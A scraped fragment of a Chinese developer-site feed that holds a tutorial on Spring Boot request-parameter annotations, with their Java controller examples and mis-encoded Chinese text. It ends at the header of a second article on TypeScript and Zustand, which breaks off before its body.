itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            SpringBoot æ¥å£è·å–å‚æ•°çš„æ³¨è§£è¯¦ç»†ä»‹ç»
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3280598429340984/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€çº¿å¤§ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-31T03:11:16.000Z" title="Sat Jan 31 2026 03:11:16 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p>SpringBoot æ¥å£è·å–å‚æ•°çš„æ³¨è§£éå¸¸ä¸°å¯Œï¼Œä¸‹é¢è¯¦ç»†ä»‹ç»ä¸€ä¸‹å¸¸ç”¨çš„å‚æ•°æ³¨è§£ï¼š</p>
<h2 data-id="heading-0">1ã€URL è·¯å¾„å‚æ•°</h2>
<h3 data-id="heading-1">1.1. <code>@PathVariable</code></h3>
<p>è·å– URL è·¯å¾„ä¸­çš„å‚æ•°</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// è·å–å•ä¸ªå‚æ•°</span>
<span class="hljs-meta">@GetMapping("/user/{id}")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUserById</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Long id)</span> {
    <span class="hljs-keyword">return</span> userService.findById(id);
}

<span class="hljs-comment">// è·å–å¤šä¸ªå‚æ•°</span>
<span class="hljs-meta">@GetMapping("/user/{id}/post/{postId}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(
    <span class="hljs-meta">@PathVariable</span> Long id,
    <span class="hljs-meta">@PathVariable</span> Long postId
)</span> {
    <span class="hljs-comment">// ...</span>
}

<span class="hljs-comment">// å‚æ•°åä¸ä¸€è‡´æ—¶æŒ‡å®š</span>
<span class="hljs-meta">@GetMapping("/user/{userId}")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">getUser</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable("userId")</span> Long id)</span> {
    <span class="hljs-keyword">return</span> userService.findById(id);
}

<span class="hljs-comment">// è·å–æ‰€æœ‰è·¯å¾„å˜é‡ï¼ˆMapå½¢å¼ï¼‰</span>
<span class="hljs-meta">@GetMapping("/user/{id}/post/{postId}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(<span class="hljs-meta">@PathVariable</span> Map&lt;String, String&gt; pathVariables)</span> {
    <span class="hljs-keyword">return</span> pathVariables.get(<span class="hljs-string">"id"</span>);
}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// URLè·¯å¾„ä¸­çš„æ—¶é—´å‚æ•°</span>
<span class="hljs-meta">@GetMapping("/events/date/{date}")</span>
<span class="hljs-keyword">public</span> List&lt;Event&gt; <span class="hljs-title function_">getEventsByPathDate</span><span class="hljs-params">(
    <span class="hljs-meta">@PathVariable</span> <span class="hljs-meta">@DateTimeFormat(pattern = "yyyy-MM-dd")</span> Date date)</span> {
    <span class="hljs-keyword">return</span> eventService.findByDate(date);
}

<span class="hljs-meta">@GetMapping("/events/datetime/{datetime}")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getByDateTime</span><span class="hljs-params">(
    <span class="hljs-meta">@PathVariable</span> <span class="hljs-meta">@DateTimeFormat(pattern = "yyyy-MM-dd HH:mm:ss")</span> LocalDateTime datetime)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ—¶é—´: "</span> + datetime;
}
</code></pre>
<h2 data-id="heading-2">2. æŸ¥è¯¢å‚æ•°ï¼ˆURL å‚æ•°ï¼‰</h2>
<h3 data-id="heading-3">2.1. <code>@RequestParam</code></h3>
<p>è·å– URL æŸ¥è¯¢å­—ç¬¦ä¸²å‚æ•°</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¿…å¡«å‚æ•°</span>
<span class="hljs-meta">@GetMapping("/users")</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> String name)</span> {
    <span class="hljs-keyword">return</span> userService.findByName(name);
}

<span class="hljs-comment">// å¯é€‰å‚æ•°</span>
<span class="hljs-meta">@GetMapping("/users")</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestParam(required = false)</span> String name,
    <span class="hljs-meta">@RequestParam(defaultValue = "1")</span> <span class="hljs-type">int</span> page,
    <span class="hljs-meta">@RequestParam(defaultValue = "10")</span> <span class="hljs-type">int</span> size
)</span> {
    <span class="hljs-keyword">return</span> userService.findByName(name, page, size);
}

<span class="hljs-comment">// æ¥æ”¶å¤šä¸ªå€¼</span>
<span class="hljs-meta">@GetMapping("/users")</span>
<span class="hljs-keyword">public</span> List&lt;User&gt; <span class="hljs-title function_">getUsers</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> List&lt;Long&gt; ids)</span> {
    <span class="hljs-keyword">return</span> userService.findByIds(ids);
}

<span class="hljs-comment">// è·å–æ‰€æœ‰æŸ¥è¯¢å‚æ•°ï¼ˆMapå½¢å¼ï¼‰</span>
<span class="hljs-meta">@GetMapping("/search")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">search</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Map&lt;String, String&gt; params)</span> {
    <span class="hljs-keyword">return</span> params.get(<span class="hljs-string">"keyword"</span>);
}
</code></pre>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// æŸ¥è¯¢å‚æ•°ä¸­çš„æ—¶é—´</span>
<span class="hljs-meta">@GetMapping("/events")</span>
<span class="hljs-keyword">public</span> List&lt;Event&gt; <span class="hljs-title function_">getEventsByDate</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestParam</span> <span class="hljs-meta">@DateTimeFormat(pattern = "yyyy-MM-dd")</span> Date date)</span> {
    <span class="hljs-keyword">return</span> eventService.findByDate(date);
}

<span class="hljs-comment">// å¤šä¸ªæ—¶é—´å‚æ•°</span>
<span class="hljs-meta">@GetMapping("/events/range")</span>
<span class="hljs-keyword">public</span> List&lt;Event&gt; <span class="hljs-title function_">getEventsByRange</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestParam</span> <span class="hljs-meta">@DateTimeFormat(pattern = "yyyy-MM-dd")</span> Date startDate,
    <span class="hljs-meta">@RequestParam</span> <span class="hljs-meta">@DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME)</span> LocalDateTime endTime)</span> {
    <span class="hljs-keyword">return</span> eventService.findByDateRange(startDate, endTime);
}
</code></pre>
<h2 data-id="heading-4">3. è¯·æ±‚ä½“å‚æ•°</h2>
<h3 data-id="heading-5">3.1. <code>@RequestBody</code></h3>
<p>è·å– JSON/XML æ ¼å¼çš„è¯·æ±‚ä½“</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/user")</span>
<span class="hljs-keyword">public</span> User <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> User user)</span> {
    <span class="hljs-keyword">return</span> userService.save(user);
}

<span class="hljs-comment">// æ¥æ”¶ Map ç±»å‹çš„è¯·æ±‚ä½“</span>
<span class="hljs-meta">@PostMapping("/data")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">processData</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Map&lt;String, Object&gt; data)</span> {
    <span class="hljs-keyword">return</span> data.toString();
}

<span class="hljs-comment">// ä½¿ç”¨ DTO æ¥æ”¶å‚æ•°</span>
<span class="hljs-meta">@PostMapping("/register")</span>
<span class="hljs-keyword">public</span> ResponseEntity&lt;?&gt; register(<span class="hljs-meta">@RequestBody</span> RegisterDTO registerDTO) {
    <span class="hljs-comment">// å¤„ç†æ³¨å†Œé€»è¾‘</span>
    <span class="hljs-keyword">return</span> ResponseEntity.ok(<span class="hljs-string">"æ³¨å†ŒæˆåŠŸ"</span>);
}
</code></pre>
<h3 data-id="heading-6">3.2. <code>@ModelAttribute</code></h3>
<p>è·å–è¡¨å•æ•°æ®ï¼ˆæ”¯æŒ GET/POSTï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç»‘å®šåˆ°å¯¹è±¡</span>
<span class="hljs-meta">@PostMapping("/user")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@ModelAttribute</span> User user)</span> {
    userService.save(user);
    <span class="hljs-keyword">return</span> <span class="hljs-string">"success"</span>;
}

<span class="hljs-comment">// ç»‘å®šåˆ° Map</span>
<span class="hljs-meta">@PostMapping("/user")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">createUser</span><span class="hljs-params">(<span class="hljs-meta">@ModelAttribute</span> Map&lt;String, Object&gt; model)</span> {
    <span class="hljs-keyword">return</span> model.get(<span class="hljs-string">"name"</span>).toString();
}
</code></pre>
<h2 data-id="heading-7">4. è¯·æ±‚å¤´å‚æ•°</h2>
<h3 data-id="heading-8">4.1. <code>@RequestHeader</code></h3>
<p>è·å– HTTP è¯·æ±‚å¤´ä¿¡æ¯</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/info")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getInfo</span><span class="hljs-params">(
    <span class="hljs-meta">@RequestHeader("User-Agent")</span> String userAgent,
    <span class="hljs-meta">@RequestHeader(value = "Authorization", required = false)</span> String auth,
    <span class="hljs-meta">@RequestHeader</span> Map&lt;String, String&gt; headers
)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"User-Agent: "</span> + userAgent;
}
</code></pre>
<h2 data-id="heading-9">5. Cookie å‚æ•°</h2>
<h3 data-id="heading-10">5.1. <code>@CookieValue</code></h3>
<p>è·å– Cookie ä¸­çš„å€¼</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/profile")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProfile</span><span class="hljs-params">(<span class="hljs-meta">@CookieValue("sessionId")</span> String sessionId)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Session ID: "</span> + sessionId;
}

<span class="hljs-comment">// å¯é€‰å‚æ•°</span>
<span class="hljs-meta">@GetMapping("/profile")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getProfile</span><span class="hljs-params">(
    <span class="hljs-meta">@CookieValue(value = "sessionId", defaultValue = "default")</span> String sessionId
)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Session ID: "</span> + sessionId;
}
</code></pre>
<h2 data-id="heading-11">6. æ–‡ä»¶ä¸Šä¼ å‚æ•°</h2>
<h3 data-id="heading-12">6.1. <code>@RequestPart</code></h3>
<p>è·å–æ–‡ä»¶ä¸Šä¼ å†…å®¹</p>
<p><code>@RequestPart</code>å¤„ç† multipart/form-data è¯·æ±‚ä¸­çš„å¤æ‚æ•°æ®ç±»å‹ï¼Œæ”¯æŒæ–‡ä»¶ä¸Šä¼ å’Œæ··åˆè¡¨å•æ•°æ®ï¼ˆå¦‚ JSON + æ–‡ä»¶ï¼‰ã€‚</p>








































<table><thead><tr><th>ç‰¹æ€§</th><th>@RequestPart</th><th>@RequestParam</th></tr></thead><tbody><tr><td>æ•°æ®æ ¼å¼</td><td>æ”¯æŒä»»ä½•å†…å®¹ç±»å‹ï¼ˆå¦‚ JSONã€XMLï¼‰</td><td>ä»…æ”¯æŒ application/x-www-form-urlencoded</td></tr><tr><td>å†…å®¹ç±»å‹</td><td>æ¯ä¸ªéƒ¨åˆ†æœ‰ç‹¬ç«‹çš„ Content-Type</td><td>æ•´ä¸ªè¯·æ±‚ç»Ÿä¸€çš„ Content-Type</td></tr><tr><td>æ•°æ®å¤„ç†</td><td>ä½¿ç”¨ HttpMessageConverter</td><td>ä½¿ç”¨ Servlet API çš„å‚æ•°è§£æ</td></tr><tr><td>æ–‡ä»¶å¤„ç†</td><td>å¤©ç„¶æ”¯æŒæ–‡ä»¶ä¸Šä¼ ï¼Œæ”¯æŒå…¶ä»–ç±»å‹</td><td>ä»…æ”¯æŒæ–‡ä»¶ï¼ˆä½œä¸º MultipartFileï¼‰</td></tr><tr><td>JSON ç»‘å®š</td><td>ç›´æ¥ç»‘å®šåˆ°å¯¹è±¡</td><td>ä¸æ”¯æŒ</td></tr><tr><td>ä¸»è¦åº”ç”¨åœºæ™¯</td><td>ä¸Šä¼ æ–‡ä»¶åŒæ—¶å‘é€ JSON æ•°æ®â€Œï¼šå¦‚ç”¨æˆ·ä¸Šä¼ å¤´åƒå¹¶é™„å¸¦ç”¨æˆ·ä¿¡æ¯ï¼ˆJSONï¼‰ã€‚<br/>å•ä¸ªè¯·æ±‚ä¸­æ··åˆä¸åŒç±»å‹çš„æ•°æ®â€Œï¼šå¦‚åŒæ—¶ä¸Šä¼ å¤šä¸ªæ–‡ä»¶å’Œè¡¨å•æ•°æ®ã€‚<br/>REST API ä¸­çš„æ–‡ä»¶ä¸Šä¼ â€Œï¼šå¦‚ä¸Šä¼ å›¾ç‰‡å¹¶é™„å¸¦å…ƒæ•°æ®ï¼ˆJSONï¼‰ã€‚</td><td/></tr></tbody></table>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping("/api/upload")</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UploadController</span> {
    <span class="hljs-comment">// åŸºç¡€æ–‡ä»¶ä¸Šä¼ </span>
    <span class="hljs-meta">@PostMapping("/single")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadSingle</span><span class="hljs-params">(<span class="hljs-meta">@RequestPart("file")</span> MultipartFile file)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Uploaded: "</span> + file.getOriginalFilename();
    }

    <span class="hljs-comment">// å¤šæ–‡ä»¶ä¸Šä¼ </span>
    <span class="hljs-meta">@PostMapping("/multiple")</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadMultiple</span><span class="hljs-params">(<span class="hljs-meta">@RequestPart("files")</span> MultipartFile[] files)</span> {
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Uploaded "</span> + files.length + <span class="hljs-string">" files"</span>;
    }

    <span class="hljs-comment">// æ–‡ä»¶ + JSONå¯¹è±¡</span>
    <span class="hljs-meta">@PostMapping(value = "/upload", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)</span>
    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadData</span><span class="hljs-params">(<span class="hljs-meta">@RequestPart("file")</span> MultipartFile file, 
                             <span class="hljs-meta">@RequestPart("metadata")</span> MyMetadata metadata)</span> {
        <span class="hljs-comment">// metadata æ˜¯è‡ªå®šä¹‰çš„ JSON å¯¹è±¡</span>
        <span class="hljs-keyword">return</span> <span class="hljs-string">"Uploaded file with metadata"</span>;
    }
    
    <span class="hljs-comment">// æ–‡ä»¶ + è¡¨å•å­—æ®µ</span>
    <span class="hljs-meta">@PostMapping(value = "/upload-with-data", consumes = MediaType.MULTIPART_FORM_DATA_VALUE)</span>
    <span class="hljs-keyword">public</span> ResponseEntity&lt;?&gt; uploadWithData(
                                            <span class="hljs-meta">@RequestPart("file")</span> MultipartFile file,
                                            <span class="hljs-meta">@RequestParam("name")</span> String name,
                                            <span class="hljs-meta">@RequestParam("description")</span> String description) {
        <span class="hljs-comment">// å¤„ç†æ–‡ä»¶å’Œæ–‡æœ¬æ•°æ®</span>
        <span class="hljs-keyword">return</span> ResponseEntity.ok(<span class="hljs-string">"ä¸Šä¼ æˆåŠŸ"</span>);
    }
}
</code></pre>
<p>å¸¸è§é”™è¯¯åŠè§£å†³æ–¹æ³•:</p>
<ol>
<li>å¿˜è®°è®¾ç½® consumes = "multipart/form-data"â€Œï¼šå¯¼è‡´æ— æ³•è§£æè¯·æ±‚ã€‚</li>
<li>æ–‡ä»¶å¤§å°è¶…è¿‡é»˜è®¤é™åˆ¶â€Œï¼šéœ€é…ç½® spring.servlet.multipart.max-file-size å’Œ spring.servlet.multipart.max-request-sizeã€‚</li>
</ol>
<p>ä¸ @RequestBody çš„åŒºåˆ«:</p>
<ol>
<li>@RequestBody ç”¨äºå¤„ç† application/json æˆ– application/xml æ ¼å¼çš„è¯·æ±‚ä½“æ•°æ®ã€‚</li>
<li>@RequestPart ç”¨äºå¤„ç† multipart/form-data ä¸­çš„å¤æ‚æ•°æ®ç±»å‹ï¼ˆå¦‚ JSON + æ–‡ä»¶ï¼‰ã€‚</li>
</ol>
<h3 data-id="heading-13">6.2. <code>@RequestParam</code></h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@PostMapping("/upload-simple")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">uploadSimple</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam("file")</span> MultipartFile file)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ–‡ä»¶åç§°: "</span> + file.getOriginalFilename();
}
</code></pre>
<h2 data-id="heading-14">7. ä¼šè¯å’Œå±æ€§å‚æ•°</h2>
<h3 data-id="heading-15">7.1. <code>@SessionAttribute</code></h3>
<p>è·å–ä¼šè¯å±æ€§</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/dashboard")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">dashboard</span><span class="hljs-params">(<span class="hljs-meta">@SessionAttribute("user")</span> User user)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"æ¬¢è¿ "</span> + user.getUsername();
}
</code></pre>
<h3 data-id="heading-16">7.2. <code>@RequestAttribute</code></h3>
<p>è·å–è¯·æ±‚åŸŸå±æ€§</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/process")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">process</span><span class="hljs-params">(<span class="hljs-meta">@RequestAttribute("processedData")</span> String data)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"å¤„ç†åçš„æ•°æ®: "</span> + data;
}
</code></pre>
<h2 data-id="heading-17">8. å…¶ä»–ç‰¹æ®Šæ³¨è§£</h2>
<h3 data-id="heading-18">8.1. <code>@MatrixVariable</code></h3>
<p>è·å–çŸ©é˜µå˜é‡ï¼ˆä¸å¸¸ç”¨ï¼‰</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// URL: /cars;color=red;year=2023</span>
<span class="hljs-meta">@GetMapping("/cars")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getCar</span><span class="hljs-params">(<span class="hljs-meta">@MatrixVariable</span> String color)</span> {
    <span class="hljs-keyword">return</span> color;
}
</code></pre>
<h3 data-id="heading-19">8.2. <code>@Value</code>ï¼ˆä»é…ç½®è·å–ï¼‰</h3>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@GetMapping("/config")</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">getConfig</span><span class="hljs-params">(<span class="hljs-meta">@Value("${app.name}")</span> String appName)</span> {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"åº”ç”¨åç§°: "</span> + appName;
}
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ç”¨ TypeScript å®šä¹‰æ•°æ®å¥‘çº¦ï¼Œç”¨ Zustand å®ç°ä¸šåŠ¡æµè½¬]]></title>    <link>https://juejin.cn/post/7600986252449054760</link>    <guid>https://juejin.cn/post/7600986252449054760</guid>    <pubDate>2026-01-30T12:49:47.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7600986252449054760" data-draft-id="7600837236621000756" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ç”¨ TypeScript å®šä¹‰æ•°æ®å¥‘çº¦ï¼Œç”¨ Zustand å®ç°ä¸šåŠ¡æµè½¬"/> <meta itemprop="keywords" content="å‰ç«¯,TypeScript,å…¨æ ˆ"/> <meta itemprop="datePublished" content="2026-01-30T12:49:47.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç§ƒå¤´æ•²ç å°å§å§"/> <meta itemprop="url" content="https://juejin.cn/user/24668014656249"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ç”¨ TypeScript å®šä¹‰æ•°æ®å¥‘çº¦ï¼Œç”¨ Zustand å®ç°ä¸šåŠ¡æµè½¬
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/24668014656249/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç§ƒå¤´æ•²ç å°å§å§
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-30T12:49:47.000Z" title="Fri Jan 30 2026 12:49:47 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-30
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
